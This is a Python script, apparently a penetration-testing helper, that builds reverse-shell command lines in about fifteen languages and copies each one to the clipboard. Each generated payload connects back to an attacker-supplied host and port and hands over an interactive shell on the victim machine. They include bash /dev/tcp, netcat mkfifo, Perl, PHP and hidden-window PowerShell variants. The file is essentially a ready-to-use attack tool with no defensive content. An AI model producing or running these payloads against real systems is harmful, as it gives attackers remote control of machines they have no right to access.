#!/usr/bin/python
import os
import sys
import pyperclip

if len(sys.argv) != 4:
    print ("""
==============================================
[*] List of available  Rev.Shell command line |
==============================================
- Perl
- nc
- ncBusyBox
- Python
- PHP
- Bash
- BashUDP
- Ruby
- Java
- Awk
--- Powershell
- Lua
- Groovy
- NodeJS
- Golang

""")
    print "\n"+"\033[1;33;40m[!] Usage :\033[0;37;40m python ./reverser.py <Command-language> <LHOST> <LPORT>" +"\n"
    print "\033[1;33;40m[!] Usage-Example:\033[0;37;40m python ./reverser.py bash 10.10.10.10 443"+"\n"

    sys.exit(0)


Command_lang = sys.argv[1].lower()
LHOST = sys.argv[2]
LPORT = sys.argv[3]
copied = "\033[1;32;40m[+] Payload, Copied to Clipboard\n"

if Command_lang == "python":
    print "\n========================(Python Reverse Shell Command line)==============================\n"
    print ("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+str(LHOST)+"\","+str(LPORT)+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'")
    print "\n========================================================================================="
    pyperclip.copy("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+str(LHOST)+"\","+str(LPORT)+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'")
    print copied

if Command_lang == "bash":
    print "\n========================(Bash Reverse Shell Command line)==============================\n"
    print ("bash -i >& /dev/tcp/"+ str(LHOST) +"/"+ str(LPORT) +" 0>&1"+ "\n")
    print "\n=======================================================================================\n"
    pyperclip.copy("bash -i >& /dev/tcp/"+ str(LHOST) +"/"+ str(LPORT) +" 0>&1")
    print copied

if Command_lang == "bashudp":
    print "\n========================(Bash UDP Reverse Shell Command line)==============================\n"
    print ("sh -i >& /dev/udp/"+ str(LHOST) +"/"+ str(LPORT) +" 0>&1"+ "\n")
    print "\n=======================================================================================\n"
    pyperclip.copy("sh -i >& /dev/udp/"+ str(LHOST) +"/"+ str(LPORT) +" 0>&1")
    print copied

if Command_lang == "perl":
    print "\n========================(Perl Reverse Shell Command line)==============================\n"
    print ("perl -e \'use Socket;$i=\"" + str(LHOST) + "\";$p="+ str(LPORT) +";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'" + "\n")
    print "=========================================================================================\n"
    pyperclip.copy("perl -e \'use Socket;$i=\"" + str(LHOST) + "\";$p="+ str(LPORT) +";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'")	
    print copied

if Command_lang == "php":
    print "\n========================(PHP Reverse Shell Command line)==============================\n"
    print ("php -r '$sock=fsockopen(\""+ str(LHOST) + "\","+str(LPORT)+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    print "=========================================================================================\n"
    pyperclip.copy("php -r '$sock=fsockopen(\""+ str(LHOST) + "\","+str(LPORT)+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    print copied

if Command_lang == "ruby":
    print "\n========================(Ruby Reverse Shell Command line)==============================\n"
    print ("ruby -rsocket -e'f=TCPSocket.open(\""+ str(LHOST)+"\","+str(LPORT)+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
    print "=========================================================================================\n"
    pyperclip.copy("ruby -rsocket -e'f=TCPSocket.open(\""+ str(LHOST)+"\","+str(LPORT)+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
    print copied

if Command_lang == "nc":
    print "\n========================(Netcat Reverse Shell Command line)==============================\n"
    print ("[1]")
    print ("nc -e /bin/sh " + str(LHOST) + " " + str(LPORT)+ "\n")
    print ("[2] Netcat OpenBsd")
    print ("rm /tmp/ejsec;mkfifo /tmp/ejsec;cat /tmp/ejsec|/bin/sh -i 2>&1|nc " + str(LHOST) + " " + str(LPORT)+" >/tmp/ejsec"+"\n")
    print "=========================================================================================\n"
    pyperclip.copy("rm /tmp/ejsec;mkfifo /tmp/ejsec;cat /tmp/ejsec|/bin/sh -i 2>&1|nc " + str(LHOST) + " " + str(LPORT)+" >/tmp/ejsec")
    print "\033[1;32;40m[+] Netcat OpenBsd-Payload, Copied to Clipboard\n"

if Command_lang == "ncbusybox":
    print "\n========================(Netcat Reverse Shell Command line)==============================\n"
    print ("Netcat OpenBsd")
    print ("rm /tmp/ejsec;mknod /tmp/ejsec p;cat /tmp/ejsec|/bin/sh -i 2>&1|nc " + str(LHOST) + " " + str(LPORT)+" >/tmp/ejsec"+"\n")
    print "=========================================================================================\n"
    pyperclip.copy("rm /tmp/ejsec;mknod /tmp/ejsec p;cat /tmp/ejsec|/bin/sh -i 2>&1|nc " + str(LHOST) + " " + str(LPORT)+" >/tmp/ejsec")
    print "\033[1;32;40m[+] Netcat BusyBox-Payload, Copied to Clipboard\n"


if Command_lang == "java":
    print "\n========================(Java Reverse Shell)==============================\n"
    print ("""
r = Runtime.getRuntime()
p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/"""+ str(LHOST) + "/" +str(LPORT) +""";cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])
p.waitFor()
""")
    print "\n============================================================================\n"
    pyperclip.copy("""
r = Runtime.getRuntime()
p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/"""+ str(LHOST) + "/" +str(LPORT) +""";cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])
p.waitFor()
""")
    print copied

if Command_lang == "awk":
    print "\n========================(Awk Reverse Shell Command line)==============================\n"
    print ("awk 'BEGIN {s = \"/inet/tcp/0/"+str(LHOST)+"/"+str(LPORT)+"\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null")
    print "\n=========================================================================================\n"
    pyperclip.copy("awk 'BEGIN {s = \"/inet/tcp/0/"+str(LHOST)+"/"+str(LPORT)+"\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null")
    print copied


if Command_lang == "lua":
    print "\n========================(Lua Reverse Shell Command line)==============================\n"
    print ("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('"+str(LHOST)+"','"+str(LPORT)+ "');os.execute('/bin/sh -i <&3 >&3 2>&3');\"")
    print "\n=========================================================================================\n"
    pyperclip.copy("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('"+str(LHOST)+"','"+str(LPORT)+ "');os.execute('/bin/sh -i <&3 >&3 2>&3');\"")
    print copied

if Command_lang == "powershell":
    print "\n========================(Powershell Reverse Shell Command line)==============================\n"
    print "[1]"
    print ("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'"+str(LHOST)+"\',"+str(LPORT)+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")
    print "\n=========================================================================================\n"
    print "[2]"
    print ("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""+str(LHOST)+"\","+str(LPORT)+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
    print "\n=========================================================================================\n"
    pyperclip.copy("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'"+str(LHOST)+"\',"+str(LPORT)+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")
    print "\033[1;32;40m[+] Paylaod {1} Copied to Clipboard\n"


if Command_lang == "groovy":
    print "\n========================(Groovy Reverse Shell Command line)==============================\n"
    print ("String host=\""+str(LHOST)+"\";\nint port="+str(LPORT)+";\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();")
    print "\n=========================================================================================\n"
    pyperclip.copy("String host=\""+str(LHOST)+"\";\nint port="+str(LPORT)+";\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();")
    print copied

if Command_lang == "nodejs":
    print "\n========================(NodeJS Reverse Shell Command line)==============================\n"
    print ("(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"/bin/sh\", []);\n    var client = new net.Socket();\n    client.connect("+str(LPORT)+", \""+str(LHOST)+"\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/; // Prevents the Node.js application form crashing\n})();")
    print "\n=========================================================================================\n"
    pyperclip.copy("(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"/bin/sh\", []);\n    var client = new net.Socket();\n    client.connect("+str(LPORT)+", \""+str(LHOST)+"\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/; // Prevents the Node.js application form crashing\n})();")
    print copied

if Command_lang == "golang":
    print "\n========================(Golong Reverse Shell Command line)==============================\n"
    print ("echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\""+str(LHOST)+":"+str(LPORT)+"\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go")
    print "\n=========================================================================================\n"
    pyperclip.copy("echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\""+str(LHOST)+":"+str(LPORT)+"\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go")
    print copied

if Command_lang == "socat":
    print "\n========================(Socat Reverse Shell Command line)==============================\n"
    print ("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:"+str(LHOST)+":"+str(LPORT))
    print "\n=========================================================================================\n"
    pyperclip.copy("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:"+str(LHOST)+":"+str(LPORT))
    print copied

# Tamplate
if Command_lang == "temp":
    print "\n========================(Temp Reverse Shell Command line)==============================\n"
    print ("")
    print "\n=========================================================================================\n"
    pyperclip.copy("")
    print copied



